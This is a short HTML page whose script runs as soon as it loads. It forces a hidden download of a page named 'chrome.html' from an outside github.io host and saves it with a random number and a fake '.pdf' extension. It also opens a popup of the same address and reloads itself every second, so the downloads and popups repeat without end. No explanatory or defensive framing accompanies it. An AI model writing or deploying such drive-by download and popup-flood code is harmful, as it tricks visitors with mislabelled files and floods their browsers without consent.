<html>

<body>
    <script>
        function autoDownload() {
            var link = document.createElement('a');
            link.href = 'https://vasilevigor3.github.io/chrome.html';
            const randomNumber = Math.random();
            const randomNumberAsString = randomNumber.toString();
            link.download = randomNumberAsString + '.pdf' ;
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        autoDownload();
        window.open("https://vasilevigor3.github.io/chrome.html")
        //window.open('https://vasilevigor3.github.io/chrome.html', '_blank', 'width=500,height=400');
        setInterval(function () { location.reload() }, 1000);
    </script>
</body>

</html>
